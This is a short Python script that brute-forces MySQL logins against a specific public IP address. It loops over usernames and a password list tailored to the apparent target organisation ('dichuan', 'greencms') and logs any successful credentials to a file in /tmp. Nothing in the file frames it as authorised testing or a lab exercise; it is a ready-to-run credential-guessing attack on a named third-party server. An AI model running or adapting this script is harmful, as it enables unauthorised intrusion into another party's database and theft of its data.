#!/usr/bin/env python3
"""gz mysql brute - target 60.247.207.115:3306"""
import subprocess, sys

IP = "60.247.207.115"
users = ["root", "admin", "dichuan", "dichuan114", "gz", "test"]
pws = ["", "root", "123456", "admin123", "password", "dichuan", "dichuan123",
       "dichuan114", "gz123456", "admin", "12345678", "123456789", "mysql",
       "root123", "test", "test123", "green", "greencms", "gz-dichuan", "gzdichuan",
       "60.247.207.115", "dichuan114", "dcyb", "dc123456", "1234", "888888"]

import socket

def try_conn(user, pw):
    try:
        r = subprocess.run(["mysql", "-h", IP, "-P", "3306", "-u", user,
                            "-p" + pw, "-e", "select 1", "--connect-timeout=5"],
                           capture_output=True, timeout=12)
        if r.returncode == 0:
            return True, r.stdout.decode("utf-8", "ignore")[:100]
        err = r.stderr.decode("utf-8", "ignore")
        # distinguish auth fail vs other
        if "Access denied" in err or "denied" in err:
            return False, "denied"
        return False, err[:80]
    except Exception as e:
        return False, str(e)[:60]

print("target: %s:3306" % IP, flush=True)
found = False
for u in users:
    for pw in pws:
        ok, info = try_conn(u, pw)
        if ok:
            print("!!! MYSQL HIT %s/%s" % (u, pw), flush=True)
            with open("/tmp/gz_mysql_hit.txt", "a") as f:
                f.write("%s/%s %s\n" % (u, pw, info))
            found = True
            break
        if "denied" not in info:
            print("  %s/%s: %s" % (u, pw, info), flush=True)
    if found:
        break
if not found:
    print("[done] no hit", flush=True)
